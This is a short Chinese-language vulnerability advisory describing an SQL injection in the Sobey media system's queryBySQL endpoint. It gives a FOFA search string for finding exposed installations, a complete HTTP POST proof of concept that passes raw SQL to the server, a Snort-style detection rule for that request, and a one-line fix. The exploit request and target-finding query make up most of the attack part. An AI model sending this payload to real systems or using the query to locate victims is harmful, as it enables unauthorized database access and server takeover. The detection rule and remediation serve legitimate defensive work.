# 索贝融媒体系统 queryBySQL 存在SQL注入漏洞

索贝融媒体系统 queryBySQL 存在SQL注入漏洞，攻击者可执行任意命令导致服务器被控。

# 影响版本

索贝融媒体系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="SOBEY-融媒体"

POC/EXP：

```
POST /news-adapter/rest/s/doc/queryBySQL HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip
Connection: keep-alive
Content-Length: 33
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36

{ "SQL": "select version()" }
```

![image-20260824111838343](assets/image-20260824111838343.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"索贝融媒体 - /news-adapter/rest/s/doc/queryBySQL 原生SQL穿透注入";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri;
        content:"/news-adapter/rest/s/doc/queryBySQL";
        fast_pattern;
    http.content_type; content:"application/json";
    http.request_body;
        content:"\"SQL\"";
        content:"select"; distance:0; nocase;
        content:"version()"; distance:0; nocase;
    metadata:
        service http,
        affected_product "索贝融媒体 (SOBEY-融媒体) news-adapter",
        vulnerability_type "Direct SQL Pass-through / SQL Injection",
        severity "critical";
    classtype:web-application-attack;
    sid:1000730;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
